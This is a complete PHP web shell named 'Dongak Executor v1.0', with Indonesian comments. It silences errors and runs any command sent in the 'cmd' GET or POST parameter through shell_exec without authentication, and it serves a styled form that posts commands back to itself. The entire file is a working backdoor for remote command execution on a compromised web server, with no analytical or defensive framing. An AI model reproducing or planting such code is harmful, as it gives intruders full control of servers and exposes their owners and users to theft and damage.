<?php
@error_reporting(0);
@set_time_limit(0);

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} elseif (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
} else {
    // Tampilkan form kalo akses langsung
    echo '<!DOCTYPE html>
<html>
<head>
    <title>Dongak Executor</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
        input[type="text"] { background: #1a1a1a; color: #00ff41; border: 1px solid #00ff41; padding: 8px; width: 70%; }
        input[type="submit"] { background: #00ff41; color: #0a0a0a; border: none; padding: 8px 20px; cursor: pointer; }
        pre { background: #1a1a1a; padding: 15px; border-left: 3px solid #00ff41; overflow-x: auto; }
    </style>
</head>
<body>
    <h2>🐚 Dongak Executor v1.0</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="masukkan command..." autofocus>
        <input type="submit" value="Execute">
    </form>
    <hr>
    <div id="result"></div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            e.preventDefault();
            const cmd = document.querySelector("input[name=cmd]").value;
            fetch(window.location.href, {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: "cmd=" + encodeURIComponent(cmd)
            })
            .then(res => res.text())
            .then(html => {
                const pre = document.createElement("pre");
                pre.textContent = html;
                document.getElementById("result").innerHTML = "";
                document.getElementById("result").appendChild(pre);
            });
        });
    </script>
</body>
</html>';
}
?>
